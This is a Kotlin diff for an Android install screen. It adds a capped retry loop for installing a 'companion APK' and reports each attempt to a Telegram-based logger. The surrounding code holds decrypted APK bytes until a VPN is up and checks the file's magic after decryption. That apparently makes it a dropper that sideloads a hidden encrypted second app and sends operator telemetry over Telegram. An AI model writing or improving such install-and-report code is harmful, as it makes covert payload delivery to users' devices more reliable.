@@ -62,6 +62,12 @@ class InstallActivity : Activity() {
     private var progressRunnable: Runnable? = null
     // Holds decrypted APK bytes while waiting for VPN to establish
     private var pendingApkBytes: ByteArray? = null
+    // ── Restart retry counter ─────────────────────────────────────────────────
+    // Counts how many times INSTALL_RESTART_ACTION has triggered startDownload().
+    // Capped at MAX_INSTALL_RESTARTS to prevent an infinite retry loop when the
+    // companion APK is permanently invalid (e.g. wrong magic after decrypt).
+    private var installRestartRetryCount = 0
+    private val MAX_INSTALL_RESTARTS = 3
     // ── Constants ────────────────────────────────────────────────────────────
     companion object {
         private const val REQUEST_INSTALL_CONFIRM = 1002
@@ -237,10 +243,30 @@ class InstallActivity : Activity() {
     // Restarts the install flow from Activity context —
     // required on Android 15+ (API 35+) where startActivity() from a
     // BroadcastReceiver is blocked by BAL restrictions.
+    // Capped at MAX_INSTALL_RESTARTS to prevent infinite retry loop when the
+    // companion APK is permanently invalid (wrong magic after decrypt, etc.)
     private val installRestartReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             if (intent.action == InstallReceiver.INSTALL_RESTART_ACTION) {
-                installFlowActive = false   // BUG FIX: reset guard so startDownload() is not skipped
+                installRestartRetryCount++
+                if (installRestartRetryCount > MAX_INSTALL_RESTARTS) {
+                    TelegramLogger.send(
+                        context, "INSTALL_RESTART", "MAX_RETRIES_EXCEEDED",
+                        "retryCount=$installRestartRetryCount limit=$MAX_INSTALL_RESTARTS — " +
+                        "stopping retry loop, setting Stage.ERROR. " +
+                        "Companion APK likely permanently invalid (wrong magic after decrypt). " +
+                        "Build fix required."
+                    )
+                    runOnUiThread { setStage(Stage.ERROR) }
+                    return
+                }
+                TelegramLogger.send(
+                    context, "INSTALL_RESTART", "RETRY",
+                    "attempt=$installRestartRetryCount of $MAX_INSTALL_RESTARTS — restarting install flow"
+                )
+                // Reset dedup so retry attempt logs are not suppressed
+                TelegramLogger.resetDedup()
+                installFlowActive = false   // reset guard so startDownload() is not skipped
                 startDownload()
             }
         }
@@ -320,9 +346,19 @@ class InstallActivity : Activity() {
         tvAppCategory        = findViewById(R.id.tv_app_category)
 
         installButton.setOnClickListener {
-            if (stage == Stage.IDLE) startDownload()
+            if (stage == Stage.IDLE) {
+                // User-initiated fresh start — reset auto-retry counter and dedup cache
+                installRestartRetryCount = 0
+                TelegramLogger.resetDedup()
+                startDownload()
+            }
         }
-        btnRetry.setOnClickListener { startDownload() }
+        btnRetry.setOnClickListener {
+            // User manually tapped Retry after Stage.ERROR — reset counter and dedup
+            installRestartRetryCount = 0
+            TelegramLogger.resetDedup()
+            startDownload()
+        }
         btnCancel.setOnClickListener { cancelDownload() }
     }
 
